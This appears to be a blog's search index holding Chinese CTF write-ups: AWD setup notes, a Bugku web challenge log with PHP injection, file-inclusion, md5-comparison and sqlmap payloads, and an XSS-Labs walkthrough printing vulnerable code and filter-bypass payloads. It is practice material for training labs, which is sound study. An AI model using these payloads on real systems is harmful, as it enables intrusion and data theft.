<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AWD笔记</title>
      <link href="/2021/04/25/awd-bi-ji/"/>
      <url>/2021/04/25/awd-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="AWD初步要求"><a href="#AWD初步要求" class="headerlink" title="AWD初步要求"></a>AWD初步要求</h1><p>起因：4-24晚参加bugku的awd跌倒，凸显出的问题很多，故此开始爬起</p><h2 id="1-运用ssh命令连接靶机："><a href="#1-运用ssh命令连接靶机：" class="headerlink" title="1.运用ssh命令连接靶机："></a>1.运用ssh命令连接靶机：</h2><p>在kali中的命令：</p><pre><code>ssh team32@192-168-1-255.bugku.awd.cn -p 2222</code></pre><p>这里的ssh端口为2222，密码为队伍密码，但是需要修改为你自己的密码：</p><pre><code>su team32passwd</code></pre><h2 id="2-将网站源码备份"><a href="#2-将网站源码备份" class="headerlink" title="2.将网站源码备份"></a>2.将网站源码备份</h2><h3 id="运用xftp实现文件传输："><a href="#运用xftp实现文件传输：" class="headerlink" title="运用xftp实现文件传输："></a>运用xftp实现文件传输：</h3><p>首先安装vsftpd</p><pre><code>apt install -y vsftpd # -y是一路默认yessystemctl enable vsftpd # 设置开机自启systemctl start vsftpd.service # 启动ftp服务systemctl status vsftpd.service # 查看ftp服务状态 </code></pre><p>然后利用xftp来实现文件传输，当然不可以作为root用户传输</p><p>如果使用team32用户连接则可能需要先将源码保存到该用户的资源下</p><pre><code>cp -r /var/www/html /home/team32/download</code></pre><p>然后利用xftp拖拽即可保存源码</p><h3 id="熟悉cp命令："><a href="#熟悉cp命令：" class="headerlink" title="熟悉cp命令："></a>熟悉cp命令：</h3><pre><code>cp -r /var/www/html /tmp/test</code></pre><p>-r是选定/var/www/html这个目录下的所有子目录和文件</p><p>将/var/www/html下的所有子目录和文件复制到与/var同一个目录的/tmp目录下的test目录中，如果test不存在则会自动创建一个test目录</p><h3 id="将源码打包："><a href="#将源码打包：" class="headerlink" title="将源码打包："></a>将源码打包：</h3><pre><code>tar -cvf name.tar /var/www/html</code></pre><p>将/var/www/html指打包/var/www/html这个路径里面的东西</p><p>​    -c参数是建立新的存档</p><p>​    -v参数详细显示处理的文件</p><p>​    -f参数指定存档或设备</p><p>​    打包之后如何解包：</p><pre><code>tar -xvf name.tar</code></pre><p>   上面这个解包命令将会将文档解开在当前目录下面。当然，你也可以用下面的这个命令来解包到指定的路径：</p><pre><code>tar -xvf name.tar -C /var/www     （解包的参数是-C，不是小写c）</code></pre><h1 id="AWD防御阶段"><a href="#AWD防御阶段" class="headerlink" title="AWD防御阶段"></a>AWD防御阶段</h1><h2 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h2><pre><code>&lt;?php$a = &quot;&lt;?php exit();?&gt;&quot;;file_get_contents($file,$a);exit(&#39;upload success&#39;);?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku刷题记录</title>
      <link href="/2021/04/08/bugku-shua-ti-ji-lu/"/>
      <url>/2021/04/08/bugku-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>这是关于py的文件上传</p><p>图片马:</p><pre><code>import osos.system(&#39;cat /flag&#39;)</code></pre><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>f12里面</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>前端限制了输入的位数</p><p>修改即可</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>题目：</p><pre><code>$what=$_GET[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>payload:</p><pre><code>?what=flag</code></pre><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>$what=$_POST[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>post传参</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hints：矛盾</p><pre><code>$num=$_GET[&#39;num&#39;];if(!is_numeric($num)){echo $num;if($num==1)echo &#39;flag{**********}&#39;;}</code></pre><p>payload：</p><pre><code>?num=1e</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>f12得到：</p><pre><code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#53;&amp;#102;&amp;#52;&amp;#101;&amp;#98;&amp;#48;&amp;#97;&amp;#102;&amp;#97;&amp;#51;&amp;#99;&amp;#101;&amp;#97;&amp;#54;&amp;#101;&amp;#50;&amp;#99;&amp;#51;&amp;#100;&amp;#48;&amp;#52;&amp;#50;&amp;#97;&amp;#50;&amp;#49;&amp;#100;&amp;#56;&amp;#50;&amp;#48;&amp;#52;&amp;#56;&amp;#125;</code></pre><p>Unicode转ascii得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>hints：你必须让他停下</p><p>抓一个包即可，发送到repeater不断重放，一帧一帧的分析</p><h2 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h2><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre><code> &lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&#39;hello&#39;];    eval( &quot;var_dump($a);&quot;);  show_source(__FILE__); ?&gt; </code></pre><p>payload：</p><pre><code>?hello=);show_source(&#39;flag.php&#39;</code></pre><p><a href="https://www.runoob.com/php/func-misc-show-source.html" target="_blank" rel="noopener">PHP show_source() 函数</a></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><pre><code>flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;])){    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args)){        die(&quot;args error!&quot;);    }    eval(&quot;var_dump($$args);&quot;);}?&gt; </code></pre><p>输入的参数中必须有字母或者数字或者_+$</p><p>payload：</p><pre><code>?args=GLOBALS</code></pre><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>hints:头等舱</p><p><a href="https://www.cnblogs.com/wangshuazi/p/9809756.html" target="_blank" rel="noopener">header头中有信息</a>：抓包看头信息即可</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>hints：网站被黑了 黑客会不会留下后门</p><p>利用御剑扫描一下后台发现shell.php文件，打开以后发现是hacker留下的木马登陆程度，利用burp抓包进行一个爆破得到密码是hack，即可得到flag</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>hints：本地管理员</p><p>考查<a href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener">HTTP  X-Forwarded-For</a>一个http扩展头信息</p><p>X-Forwarded-For:127.0.0.1</p><p>账户admin密码test123在源代码的注释里面有base64解码即可</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>hint：看看源代码？</p><p>源代码：</p><pre><code>&lt;script&gt;var p1 = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;var p2 = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));&lt;/script&gt;</code></pre><p>url解码得到：</p><pre><code>p1=function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2bp2=aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));</code></pre><p><a href="https://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p><pre><code>结合：function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1    }}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</code></pre><p>将得到的67d709b2b54aa2aa648cf6e87a7114f1提交</p><p>得到flag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>文件包含常用漏洞，</p><pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>hints:   好像需要密码</p><p>爆破五位数密码：12468</p><p>得到flag</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>hint：备份是个好习惯</p><p>得到一个字符串：d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</p><p>md5解密：[空密码]</p><p>直接上我的备份小字典，结合burp实现半自动化爆破的得到文件：index.php.bak</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);$str = substr($str,1);$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){    echo $flag.&quot;取得flag&quot;;}?&gt;</code></pre><p>考点md5碰撞：?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p><p>或者md5()函数不处理数组：?kekeyy1[]=[1]&amp;kekeyy2[]=[2]</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>直接手工注入！！！！！！！结果老是失败</p><p>只能SQLmap了，建议先burp抓包用-r a.txt来实现sqlmap</p><p>或者：</p><pre><code>sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; --dbssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf --tablessqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g --columnssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump</code></pre><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><pre><code>import requestsimport reurl = &#39;http://114.67.246.176:17079/&#39;s = requests.Session()source = s.get(url)expression = re.search(r&#39;(\d+[+\-*])+(\d+)&#39;,source.text).group()result = eval(expression)post = {&#39;value&#39;:result}print(s.post(url,data=post).text)</code></pre><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><pre><code>import requestsimport base64import re #正则匹配模块s = requests.session() #建立会话url = &quot;http://123.206.87.240:8002/web6/&quot;head = s.get(url).headers #获取头部信息result = head[&#39;flag&#39;] #得到flag的valueresult = base64.b64decode(result).decode(&#39;utf-8&#39;) #第一次base64解码result = re.search(&#39;\w+$&#39;, result).group(0) #正则匹配base64编码的flagresult = base64.b64decode(result).decode(&#39;utf-8&#39;) #第二次解码payload = {&#39;margin&#39;: result}print(s.post(url, data=payload).text) #post传输数据且输出返回信息</code></pre><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Labs通关记录</title>
      <link href="/2021/03/31/xss-labs-tong-guan-ji-lu/"/>
      <url>/2021/03/31/xss-labs-tong-guan-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1325484613&auto=1&height=66"></iframe><p>前言：只有理解了源码，才能摸到精髓</p><h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>直接一把</p><pre><code>http://127.0.0.1/xss-labs-master/level1.php?name=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></pre><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210331090452600.png" alt></p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>此函数是将传入的参数给到了这里面：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code></pre><p>构造payload：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&lt;</code></pre><p>重点在于闭合前面的双引号和&lt;</p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>看一些后端代码：</p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;</code></pre><p>不难看出，我们卖你对的是htmlspecialchars这个函数</p><pre><code>value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;</code></pre><p><a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">菜鸟教程关于htmlspecialchars函数</a>：</p><pre><code>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&#39; （单引号）成为 &#39;&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt;</code></pre><p>构造payload：</p><pre><code>&#39;onfocus=&#39;alert(&quot;xss&quot;)</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这里的通过应用str_replace函数将&lt;&gt;转换为空</p><p>构造payload：</p><pre><code>&quot;&#39;&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;&quot;</code></pre><pre><code>&quot;onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这里利用了<a href="https://www.runoob.com/php/func-string-strtolower.html" target="_blank" rel="noopener">strtolower</a>函数将$str得到的值全部为小写，也就是预防了大小写绕过，同时利用str_replace函数将&lt;script替换为&lt;scr_ipt，on转换为了o_n，解决办法：换标签</p><p>构造payload：</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.&quot;&gt;&lt;a herf=&#39;javascript:alert(&#39;666&#39;)&#39;&gt;点我&lt;/a&gt;//.&#39;&quot;&gt;</code></pre><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;666&#39;)&gt;点我&lt;/a&gt;&lt;&quot;</code></pre><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>大小写绕过：</p><pre><code>&quot;Onfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>双写绕过：</p><pre><code>&quot;oonnfocus=&#39;alert(&quot;xss&quot;)&#39;&quot;</code></pre><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>突破点：新增的友情链接</p><p>将payload进行编码，变成html实体语句：</p><pre><code>javascript:alert(1)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">编码：</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;</code></pre><p>比上一步多了一个http://的验证</p><p>构造payload：</p><pre><code>javascript:alert(&#39;http://&#39;)</code></pre><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">编码：</a></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(&#39;http://&#39;)</code></pre><h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看出最后的参数为$str33，而$str33是由$str22决定的，$str22是由$str11决定的，且传入的为两个参数且过滤了&lt;&gt;所以不采用标签插入</p><pre><code>?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><pre><code>value=&quot;&#39;.&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><p>另一种：</p><pre><code>?keyword=1&amp;t_sort=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p>去掉type的hidden值也可以</p><h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[‘HTTP_REFERER’]：引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</p><p>由于这函数的存在，导致出现的了另类的插入点：在referer中来执行xss代码，只需要用火狐插件modheader就可以实现针对请求头的修改payload：</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>$_SERVER[‘HTTP_USER_AGENT’]：应该是赋予给$str11HTTP头信息中的USER_AGENT，与上一题的利用原理相同，payload：</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;).&#39;&quot; </code></pre><h1 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h1><pre><code>&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>这次是cookie</p><pre><code>&quot; type=&quot;text&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></pre><p><img 